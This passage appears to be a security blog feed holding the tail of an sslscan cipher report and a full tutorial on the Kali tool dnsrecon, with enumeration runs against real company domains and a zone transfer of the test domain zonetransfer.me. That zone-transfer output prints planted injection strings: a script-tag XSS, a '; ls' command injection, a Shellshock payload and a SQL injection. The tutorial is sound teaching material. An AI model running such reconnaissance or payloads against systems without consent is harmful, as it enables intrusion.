             AES256-SHA                    &ndash;              256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES128-SHA                    &ndash;              128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a></p></li>
<li><p>TLSV1 Cipher Suites:
  Preferred:                     <br/>
             ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
  Accepted:                      <br/>
             ECDHE-RSA-AES256-SHA          ECDH-256 bits  256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES256-SHA                    &ndash;              256 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             AES128-SHA                    &ndash;              128 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a>
             DES-CBC3-SHA                  &ndash;              112 bits      HTTP 301 Unknown Error &ndash; <a href="https://www.bugcrowd.com/">https://www.bugcrowd.com/</a></p></li>
<li><p>SSLV3 Cipher Suites:
  Server rejected all cipher suites.</p></li>
</ul>


<p> SCAN COMPLETED IN 1.71 S</p>

<hr />

<p>```</p>

<p>```</p>

<hr />

<p>/ Noise proves nothing. Often a hen who \
| has merely laid an egg cackles as if  |
| she laid an asteroid.                 |
|                                       |
\ &mdash; Mark Twain                         /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[dnsrecon - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/12/dnsrecon-kali-linux-tools/"/>
    <updated>2017-07-12T14:41:27-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/12/dnsrecon-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: perform thorough DNS enumeration and subdomain bruteforcing on a target. dnsrecon is true to its name, it&rsquo;s written in Python, and judging from the number of stars on its Github repository, it&rsquo;s a much more popular choice than the other candidates in Kali&rsquo;s DNS section.</p>

<p>Homepage: <a href="https://github.com/darkoperator/dnsrecon">https://github.com/darkoperator/dnsrecon</a></p>

<!-- more -->


<h2>dnsrecon description</h2>

<blockquote><p>This script provides the ability to perform:</p>

<p>Check all NS Records for Zone Transfers.</p>

<p>Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF and TXT).</p>

<p>Perform common SRV Record Enumeration.</p>

<p>Top Level Domain (TLD) Expansion.</p>

<p>Check for Wildcard Resolution.</p>

<p>Brute Force subdomain and host A and AAAA records given a domain and a wordlist.</p>

<p>Perform a PTR Record lookup for a given IP Range or CIDR.</p>

<p>Check a DNS Server Cached records for A, AAAA and CNAME Records provided a list of host records in a text file to
check.</p>

<p>Enumerate Common mDNS records in the Local Network</p>

<p>Enumerate Hosts and Subdomains using Google</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/zesty/man1/dnsrecon.1.html">http://manpages.ubuntu.com/manpages/zesty/man1/dnsrecon.1.html</a></p>

<h2>dnsrecon options</h2>

<p>```
Version: 0.8.10
Usage: dnsrecon.py <options></p>

<p>Options:
   -h, &mdash;help                   Show this help message and exit.
   -d, &mdash;domain      <domain>   Target domain.
   -r, &mdash;range       <range>    IP range for reverse lookup brute force in formats (first-last) or in (range/bitmask).
   -n, &mdash;name_server <name>     Domain server to use. If none is given, the SOA of the target will be used.
   -D, &mdash;dictionary  <file>     Dictionary file of subdomain and hostnames to use for brute force.
   -f                           Filter out of brute force domain lookup, records that resolve to the wildcard defined</p>

<pre><code>                            IP address when saving records.
</code></pre>

<p>   -t, &mdash;type        <types>    Type of enumeration to perform:</p>

<pre><code>                            std       SOA, NS, A, AAAA, MX and SRV if AXRF on the NS servers fail.
                            rvl       Reverse lookup of a given CIDR or IP range.
                            brt       Brute force domains and hosts using a given dictionary.
                            srv       SRV records.
                            axfr      Test all NS servers for a zone transfer.
                            goo       Perform Google search for subdomains and hosts.
                            snoop     Perform cache snooping against all NS servers for a given domain, testing
                                      all with file containing the domains, file given with -D option.
                            tld       Remove the TLD of given domain and test against all TLDs registered in IANA.
                            zonewalk  Perform a DNSSEC zone walk using NSEC records.
</code></pre>

<p>   -a                           Perform AXFR with standard enumeration.
   -s                           Perform a reverse lookup of IPv4 ranges in the SPF record with standard enumeration.
   -g                           Perform Google enumeration with standard enumeration.
   -w                           Perform deep whois record analysis and reverse lookup of IP ranges found through</p>

<pre><code>                            Whois when doing a standard enumeration.
</code></pre>

<p>   -z                           Performs a DNSSEC zone walk with standard enumeration.
   &mdash;threads         <number>   Number of threads to use in reverse lookups, forward lookups, brute force and SRV</p>

<pre><code>                            record enumeration.
</code></pre>

<p>   &mdash;lifetime        <number>   Time to wait for a server to response to a query.
   &mdash;db              <file>     SQLite 3 file to save found records.
   &mdash;xml             <file>     XML file to save found records.
   &mdash;iw                         Continue brute forcing a domain even if a wildcard records are discovered.
   -c, &mdash;csv         <file>     Comma separated value file.
   -j, &mdash;json        <file>     JSON file.
   -v                           Show attempts in the brute force modes.
```</p>

<h2>dnsrecon usage</h2>

<ul>
<li>general enumeration</li>
</ul>


<p><code>
dnsrecon -d asterisk.org
[*] Performing General Enumeration of Domain: asterisk.org
[-] DNSSEC is not configured for asterisk.org
[*]      SOA ns.digium.com 216.207.245.18
[*]      NS nsx3.digium.com 166.78.177.30
[*]      Bind Version for 166.78.177.30 9.8.4-rpz2+rl005.12-P1
[*]      NS nsx2.digium.com 216.207.245.19
[*]      Bind Version for 216.207.245.19 9.8.1-P1
[*]      NS nsx1.digium.com 216.207.245.18
[*]      Bind Version for 216.207.245.18 9.8.1-P1
[*]      MX mail.digium.com 216.207.245.2
[*]      A asterisk.org 216.207.245.25
[*] Enumerating SRV Records
[*]      SRV _sip._udp.asterisk.org sip.asterisk.org 204.91.156.60 5060 0
[*] 1 Records Found
</code></p>

<p>For this example I selected a site that would also have SRV records. These records help with identifying certain services, in this case SIP for VoIP. Here you can see SIP being used on port 5060 on the host with the address 204.91.156.60.</p>

<ul>
<li>perform Google search enumeration</li>
</ul>


<p><code>
dnsrecon -d uber.com -g
[*] Performing General Enumeration of Domain: uber.com
[-] DNSSEC is not configured for uber.com
[*]      SOA pdns80.ultradns.com 156.154.64.80
[*]      NS pdns80.ultradns.net 156.154.65.80
[*]      Bind Version for 156.154.65.80 UltraDNS Resolver
[*]      NS pdns80.ultradns.net 2610:a1:1014::74
[*]      NS pdns80.ultradns.biz 156.154.66.80
[*]      Bind Version for 156.154.66.80 UltraDNS Resolver
[*]      NS pdns80.ultradns.biz 2610:a1:1015::74
[*]      NS pdns80.ultradns.org 156.154.67.80
[*]      Bind Version for 156.154.67.80 UltraDNS Resolver
[*]      NS pdns80.ultradns.org 2001:502:4612::74
[*]      NS pdns80.ultradns.com 156.154.64.80
[*]      Bind Version for 156.154.64.80 UltraDNS Resolver
[*]      NS pdns80.ultradns.com 2001:502:f3ff::74
[*]      MX alt4.aspmx.l.google.com 74.125.28.27
[*]      MX alt2.aspmx.l.google.com 74.125.200.26
[*]      MX alt3.aspmx.l.google.com 74.125.23.26
[*]      MX alt1.aspmx.l.google.com 64.233.161.27
[*]      MX aspmx.l.google.com 64.233.167.26
[*]      MX alt4.aspmx.l.google.com 2607:f8b0:400e:c04::1a
[*]      MX alt2.aspmx.l.google.com 2404:6800:4003:c00::1b
[*]      MX alt3.aspmx.l.google.com 2404:6800:4008:c02::1a
[*]      MX alt1.aspmx.l.google.com 2a00:1450:4010:c01::1b
[*]      MX aspmx.l.google.com 2a00:1450:400c:c0c::1b
[*]      A uber.com 104.36.192.133
[*]      A uber.com 104.36.192.221
[*]      A uber.com 104.36.192.183
[*]      A uber.com 104.36.192.132
[*]      A uber.com 104.36.192.135
[*]      A uber.com 104.36.192.220
[*]      A uber.com 104.36.192.182
[*]      TXT uber.com v=spf1 include:uber.com._nspf.vali.email include:%{i}._ip.%{h}._ehlo.%{d}._spf.vali.email ~all
[*]      TXT uber.com google-site-verification=pO8Bhyhw0N0939yKp6cQICCpvY--sebhQKWGviAkuLM
[*]      TXT uber.com docusign=635f0402-4f58-42de-8e07-e1da6d8a971a
[*] Enumerating SRV Records
[*]      SRV _kerberos._udp.uber.com kerberos.uber.com 10.6.0.74 88 0
[*]      SRV _kpasswd._udp.uber.com kerberos.uber.com 10.6.0.74 464 0
[*] 2 Records Found
[*] Performing Google Search Enumeration
[*]      CNAME www.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      CNAME help.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      CNAME ride.uber.com d3b8kpte4epqc9.cloudfront.net
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.6
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.61
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.99
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.205
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.188
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.243
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.77
[*]      A d3b8kpte4epqc9.cloudfront.net 13.32.22.181
[*]      CNAME bonjour.uber.com frontends-geo.uber.com
[*]      CNAME frontends-geo.uber.com geo-frontends-dca1.uber.com
[*]      CNAME geo-frontends-dca1.uber.com frontends-dca1.uber.com
[*]      A frontends-dca1.uber.com 104.36.194.234
[*]      A frontends-dca1.uber.com 104.36.194.160
[*]      A frontends-dca1.uber.com 104.36.194.133
[*]      A frontends-dca1.uber.com 104.36.194.131
[*]      CNAME accessibility.uber.com uberpolicy.wpengine.com
[*]      A uberpolicy.wpengine.com 35.184.61.224
[*]      CNAME drive.uber.com uberdrive.wpengine.com
[*]      A uberdrive.wpengine.com 35.184.61.224
[*]      CNAME central.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      CNAME dial.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      CNAME developer.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      CNAME t.uber.com ghs.google.com
[*]      CNAME ghs.google.com ghs.l.google.com
[*]      A ghs.l.google.com 172.217.16.179
[*]      CNAME t.uber.com ghs.google.com
[*]      CNAME ghs.google.com ghs.l.google.com
[*]      AAAA ghs.l.google.com 2a00:1450:4001:817::2013
[*]      CNAME newsroom.uber.com ubernewblog.wpengine.com
[*]      A ubernewblog.wpengine.com 35.184.61.224
[*]      CNAME rush.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      CNAME join.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A pages.et.uber.com 198.245.92.62
[*]      CNAME get.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      CNAME freight.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      CNAME eng.uber.com ubereng.wpengine.com
[*]      A ubereng.wpengine.com 35.184.61.224
[*]      CNAME movement.uber.com frontends-geo.uber.com
[*]      CNAME frontends-geo.uber.com geo-frontends-dca1.uber.com
[*]      CNAME geo-frontends-dca1.uber.com frontends-dca1.uber.com
[*]      A frontends-dca1.uber.com 104.36.194.234
[*]      A frontends-dca1.uber.com 104.36.194.160
[*]      A frontends-dca1.uber.com 104.36.194.131
[*]      A frontends-dca1.uber.com 104.36.194.133
[*]      CNAME m.uber.com frontends.uber.com
[*]      CNAME frontends.uber.com frontends-sjc1.uber.com
[*]      A frontends-sjc1.uber.com 104.36.192.183
[*]      A frontends-sjc1.uber.com 104.36.192.221
[*]      A frontends-sjc1.uber.com 104.36.192.202
[*]      A frontends-sjc1.uber.com 104.36.192.135
[*] 98 Records Found
</code></p>

<ul>
<li>pull SRV records of domain</li>
</ul>


<p><code>
dnsrecon -d cisco.com -t srv
[*] Enumerating Common SRV Records against cisco.com
[*]      SRV _sip._tcp.cisco.com vcsgw.cisco.com 173.36.224.91 5060 10
[*]      SRV _sips._tcp.cisco.com vcsgw.cisco.com 173.36.224.91 5061 10
[*]      SRV _h323ls._udp.cisco.com vcsgw.cisco.com 173.36.224.91 1719 10
[*]      SRV _sip._udp.cisco.com vcsgw.cisco.com 173.36.224.91 5060 10
[*]      SRV _h323cs._tcp.cisco.com vcsgw.cisco.com 173.36.224.91 1720 10
[*]      SRV _xmpp-client._tcp.cisco.com isj3cmx.webexconnect.com 66.163.36.181 5222 1
[*]      SRV _xmpp-server._tcp.cisco.com isj3jxf.webexconnect.com 66.163.36.186 5269 1
[*] 7 Records Found
</code></p>

<ul>
<li>domain bruteforcing</li>
</ul>


<p><code>
dnsrecon -D /usr/share/wordlists/dnsmap.txt -t brt -d line.me
[*] Performing host and subdomain brute force against line.me
[*]      A ads.line.me 203.104.153.62
[*]      A agp.line.me 203.104.153.74
[*]      CNAME api.line.me api.line.me.akadns.net
[*]      CNAME api.line.me.akadns.net im.api.line.me.edgekey.net
[*]      CNAME im.api.line.me.edgekey.net e1102.a1.akamaiedge.net
[*]      A e1102.a1.akamaiedge.net 2.17.116.42
[*]      A biz.line.me 125.6.149.168
[...]
</code></p>

<ul>
<li>reverse lookup</li>
</ul>


<p><code>
dnsrecon -d nmap.org -w
[...]
[*] Performing Whois lookup against records found.
[*] The following IP Ranges where found:
[*]      0) 162.158.0.0-162.159.255.255 Cloudflare, Inc.
[*]      1) 74.125.0.0-74.125.255.255 Google Inc.
[*]      2) 64.233.160.0-64.233.191.255 Google Inc.
[*]      3) 45.33.0.0-45.33.127.255 Linode
[*] What Range do you wish to do a Revers Lookup for?
[*] number, comma separated list, a for all or n for none
3
[*] Linode
[*] Performing Reverse Lookup of range 45.33.0.0-45.33.127.255
[*] Performing Reverse Lookup from 45.33.0.0 to 45.33.127.255
[*]      PTR li954-9.members.linode.com 45.33.0.9
[*]      PTR li954-4.members.linode.com 45.33.0.4
[*]      PTR gw-li954.linode.com 45.33.0.1
[*]      PTR li954-7.members.linode.com 45.33.0.7
[*]      PTR cloud521.configrapp.com 45.33.0.8
[*]      PTR mr2.linode.rbkmoney.net 45.33.0.10
[*]      PTR li954-5.members.linode.com 45.33.0.5
[*]      PTR rqdq.net 45.33.0.6
[*]      PTR li954-12.members.linode.com 45.33.0.12
[...]
</code></p>

<ul>
<li>working zone transfer</li>
</ul>


<p><a href="https://digi.ninja/projects/zonetransferme.php">Robin Wood</a> has been nice enough to register a domain that allows zone transfers for testing purposes. It&rsquo;s called zonetransfer.me, and here we&rsquo;ll look at partial output from one of the name servers:</p>

<p><code>
dnsrecon -d zonetransfer.me -a
[*] Performing General Enumeration of Domain: zonetransfer.me
[*] Checking for Zone Transfer for zonetransfer.me name servers
[*] Resolving SOA Record
[*]      SOA nsztm1.digi.ninja 81.4.108.41
[*] Resolving NS Records
[*] NS Servers found:
[*]     NS nsztm1.digi.ninja 81.4.108.41
[*]     NS nsztm2.digi.ninja 167.88.42.94
[*] Removing any duplicate NS server IP Addresses...
[*]  
[*] Trying NS server 167.88.42.94
[-] Zone Transfer Failed for 167.88.42.94!
[-] Port 53 TCP is being filtered
[*]  
[*] Trying NS server 81.4.108.41
[*] 81.4.108.41 Has port 53 TCP Open
[*] Zone Transfer was successful!!
[*]      SOA nsztm1.digi.ninja 81.4.108.41
[*]      NS nsztm1.digi.ninja 81.4.108.41
[*]      NS nsztm2.digi.ninja 167.88.42.94
[*]      NS intns1.zonetransfer.me 167.88.42.94
[*]      NS intns2.zonetransfer.me 167.88.42.94
[*]      TXT google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA
[*]      TXT Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes
[*]      TXT '&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;
[*]      TXT AbCdEfG
[*]      TXT ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.
[*]      TXT ; ls
[*]      TXT () { :]}; echo ShellShocked
[*]      TXT ' or 1=1 --
[*]      TXT Robin Wood
[*]      PTR www.zonetransfer.me 217.147.177.157
[*]      MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 64.233.166.26
[*]      MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 2a00:1450:400c:c07::1a
[*]      MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 173.194.221.27
[*]      MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 2a00:1450:4010:c0a::1b
[*]      MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 74.125.130.27
[*]      MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 2404:6800:4003:c01::1b
[*]      MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 173.194.221.26
[*]      MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 2a00:1450:4010:c0b::1b
[*]      MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 74.125.130.26
[*]      MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 2404:6800:4003:c01::1b
[*]      MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 108.177.97.27
[*]      MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 2404:6800:4008:c00::1b
[*]      MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 74.125.28.27
[*]      MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 2607:f8b0:400e:c04::1b
[*]      AAAA deadbeef.zonetransfer.me dead:beaf::
[*]      AAAA ipv6actnow.org.zonetransfer.me 2001:67c:2e8:11::c100:1332
[*]      A @.zonetransfer.me 217.147.177.157
[*]      A dc-office.zonetransfer.me 143.228.181.132
[*]      A owa.zonetransfer.me 207.46.197.32
[*]      A alltcpportsopen.firewall.test.zonetransfer.me 127.0.0.1
[*]      A vpn.zonetransfer.me 174.36.59.154
[*]      A email.zonetransfer.me 74.125.206.26
[*]      A asfdbbox.zonetransfer.me 127.0.0.1
[*]      A www.zonetransfer.me 217.147.177.157
[*]      A canberra-office.zonetransfer.me 202.14.81.230
[*]      A intns1.zonetransfer.me 167.88.42.94
[*]      A intns2.zonetransfer.me 167.88.42.94
[*]      A office.zonetransfer.me 4.23.39.254
[*]      CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 52.64.62.190
[*]      CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 13.54.224.164
[*]      SRV _sip._tcp.zonetransfer.me www 5060 0 no_ip
[*]      HINFO Casio fx-700G Windows XP
[*]      RP robin robinwood
[*]      AFSDB 1 asfdbbox
[*]      AFSDB 1 asfdbbox
[*]      LOC 53 20 56.558 N 1 38 33.526 W 0.00m
[*]      NAPTR P 2 3 !^.*$!sip:customer-service@zonetransfer.me! . E2U+sip
[*]      NAPTR P 1 1  email.zonetransfer.me E2U+email
[*]      DNSKEY RSASHA256 256 03010001d5deaa18c99ca1dccd489f0b df0dcf6c60db133a0d77b424413774d7 a718dca807252bc46da6428672efc976 3ec86373f80ac1c4e36b01ca788f3f68 ed7ac4ff671b8a602b2c9b2cf24df57b c9455e6d5c5a24e3c8360cf6debb4fd3 3cda156002eb31eaeeab1146bff6bf46 28f32b1add13712a95ed7dd3ace09d77 f8de190b 3
[*]      DNSKEY RSASHA256 256 03010001d779d1f1daf7054a21ff7f82 93a1171dcd06adf6586abf4b2911354c 123273d4dce3a44735132842fecb1768 011bcbfe96d1fb9a4add600e573b0b29 dcb7fb178ba9f20b7606353f49ac8d55 d734dda898157e1ecd8b8a9eea4b8464 6091e0f8eabc4568b1a5e092009d7f0e 448b136d076188aadbb6b4ee9344a1cf 8e7cd79f 3
[*]      DNSKEY RSASHA256 257 03010001e14b3915ec8b1107d9fb66e6 8a3855023ae83eb3301ade8a7cac4ddc 798ce560740b4e6b723a2f7c9eee55d9 1496dd9cf670d30d1d7f636f59b2070f 32024316c98d74d4916b8dd30b979bd7 fa0453fc55c35af273e6d78176fbab9e f9c331c8c397656ff8bedd8357986c1f e94d590c4655e4c574289f52562db0f9 68c6ca581134f9be1aae2a3fd535aae2 45e717d334f3c8cebb17e82b091f9c52 8ef90a765a45b5591bb808050efcded5 4ee6d150094263ab0df33b57fa790a7f c64e2b368ac22bb043aa2b6051ba5d3e e1610aa99c29562c16b11588d6da23f3 64f652471fe9d0698052671f9c5ab4cb 3d9b64369dda86a63780bc00d115207d 86425a75 3
[*]      NSEC _sip._tcp
[*]      NSEC sqli
[*]      NSEC vpn
[*]      NSEC asfdbbox
[*]      NSEC deadbeef
[*]      NSEC intns1
[*]      NSEC 157.177.147.217.IN-ADDR.ARPA
[*]      NSEC asfdbauthdns
[*]      NSEC dc-office
[*]      NSEC alltcpportsopen.firewall.test
[*]      NSEC canberra-office
[*]      NSEC robinwood
[*]      NSEC testing
[*]      NSEC www
[*]      NSEC Info
[*]      NSEC dr
[*]      NSEC @
[*]      NSEC asfdbvolume
[*]      NSEC xss
[*]      NSEC email
[*]      NSEC internal
[*]      NSEC cmdexec
[*]      NSEC intns2
[*]      NSEC office
[*]      NSEC contact
[*]      NSEC owa
[*]      NSEC staging
[*]      NSEC sshock
[*]      NSEC sip
[*]      NSEC rp
[*]      NSEC DZC
[*]      NSEC ipv6actnow.org
[*] Checking for Zone Transfer for zonetransfer.me name servers
[*] Resolving SOA Record
[*]      SOA nsztm1.digi.ninja 81.4.108.41
[*] Resolving NS Records
[*] NS Servers found:
[*]     NS nsztm2.digi.ninja 167.88.42.94
[*]     NS nsztm1.digi.ninja 81.4.108.41
[*] Removing any duplicate NS server IP Addresses...
[*]  
[*] Trying NS server 167.88.42.94
[-] Zone Transfer Failed for 167.88.42.94!
[-] Port 53 TCP is being filtered
[*]  
[*] Trying NS server 81.4.108.41
[*] 81.4.108.41 Has port 53 TCP Open
[*] Zone Transfer was successful!!
[*]      SOA nsztm1.digi.ninja 81.4.108.41
[*]      NS nsztm1.digi.ninja 81.4.108.41
[*]      NS nsztm2.digi.ninja 167.88.42.94
[*]      NS intns1.zonetransfer.me 167.88.42.94
[*]      NS intns2.zonetransfer.me 167.88.42.94
[*]      TXT google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA
[*]      TXT Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes
[*]      TXT '&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;
[*]      TXT AbCdEfG
[*]      TXT ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.
[*]      TXT ; ls
[*]      TXT () { :]}; echo ShellShocked
[*]      TXT ' or 1=1 --
[*]      TXT Robin Wood
[*]      PTR www.zonetransfer.me 217.147.177.157
[*]      MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 64.233.166.26
[*]      MX @.zonetransfer.me ASPMX.L.GOOGLE.COM 2a00:1450:400c:c07::1a
[*]      MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 173.194.221.27
[*]      MX @.zonetransfer.me ALT1.ASPMX.L.GOOGLE.COM 2a00:1450:4010:c0a::1b
[*]      MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 74.125.130.27
[*]      MX @.zonetransfer.me ALT2.ASPMX.L.GOOGLE.COM 2404:6800:4003:c01::1b
[*]      MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 173.194.221.26
[*]      MX @.zonetransfer.me ASPMX2.GOOGLEMAIL.COM 2a00:1450:4010:c0b::1b
[*]      MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 74.125.130.26
[*]      MX @.zonetransfer.me ASPMX3.GOOGLEMAIL.COM 2404:6800:4003:c01::1b
[*]      MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 108.177.97.27
[*]      MX @.zonetransfer.me ASPMX4.GOOGLEMAIL.COM 2404:6800:4008:c00::1b
[*]      MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 74.125.28.27
[*]      MX @.zonetransfer.me ASPMX5.GOOGLEMAIL.COM 2607:f8b0:400e:c04::1b
[*]      AAAA deadbeef.zonetransfer.me dead:beaf::
[*]      AAAA ipv6actnow.org.zonetransfer.me 2001:67c:2e8:11::c100:1332
[*]      A @.zonetransfer.me 217.147.177.157
[*]      A dc-office.zonetransfer.me 143.228.181.132
[*]      A owa.zonetransfer.me 207.46.197.32
[*]      A alltcpportsopen.firewall.test.zonetransfer.me 127.0.0.1
[*]      A vpn.zonetransfer.me 174.36.59.154
[*]      A email.zonetransfer.me 74.125.206.26
[*]      A asfdbbox.zonetransfer.me 127.0.0.1
[*]      A www.zonetransfer.me 217.147.177.157
[*]      A canberra-office.zonetransfer.me 202.14.81.230
[*]      A intns1.zonetransfer.me 167.88.42.94
[*]      A intns2.zonetransfer.me 167.88.42.94
[*]      A office.zonetransfer.me 4.23.39.254
[*]      CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 52.64.62.190
[*]      CNAME staging.zonetransfer.me www.sydneyoperahouse.com. 13.54.224.164
[*]      SRV _sip._tcp.zonetransfer.me www 5060 0 no_ip
[*]      HINFO Casio fx-700G Windows XP
[*]      RP robin robinwood
[*]      AFSDB 1 asfdbbox
[*]      AFSDB 1 asfdbbox
[*]      LOC 53 20 56.558 N 1 38 33.526 W 0.00m
[*]      NAPTR P 2 3 !^.*$!sip:customer-service@zonetransfer.me! . E2U+sip
[*]      NAPTR P 1 1  email.zonetransfer.me E2U+email
[*]      DNSKEY RSASHA256 256 03010001d5deaa18c99ca1dccd489f0b df0dcf6c60db133a0d77b424413774d7 a718dca807252bc46da6428672efc976 3ec86373f80ac1c4e36b01ca788f3f68 ed7ac4ff671b8a602b2c9b2cf24df57b c9455e6d5c5a24e3c8360cf6debb4fd3 3cda156002eb31eaeeab1146bff6bf46 28f32b1add13712a95ed7dd3ace09d77 f8de190b 3
[*]      DNSKEY RSASHA256 256 03010001d779d1f1daf7054a21ff7f82 93a1171dcd06adf6586abf4b2911354c 123273d4dce3a44735132842fecb1768 011bcbfe96d1fb9a4add600e573b0b29 dcb7fb178ba9f20b7606353f49ac8d55 d734dda898157e1ecd8b8a9eea4b8464 6091e0f8eabc4568b1a5e092009d7f0e 448b136d076188aadbb6b4ee9344a1cf 8e7cd79f 3
[*]      DNSKEY RSASHA256 257 03010001e14b3915ec8b1107d9fb66e6 8a3855023ae83eb3301ade8a7cac4ddc 798ce560740b4e6b723a2f7c9eee55d9 1496dd9cf670d30d1d7f636f59b2070f 32024316c98d74d4916b8dd30b979bd7 fa0453fc55c35af273e6d78176fbab9e f9c331c8c397656ff8bedd8357986c1f e94d590c4655e4c574289f52562db0f9 68c6ca581134f9be1aae2a3fd535aae2 45e717d334f3c8cebb17e82b091f9c52 8ef90a765a45b5591bb808050efcded5 4ee6d150094263ab0df33b57fa790a7f c64e2b368ac22bb043aa2b6051ba5d3e e1610aa99c29562c16b11588d6da23f3 64f652471fe9d0698052671f9c5ab4cb 3d9b64369dda86a63780bc00d115207d 86425a75 3
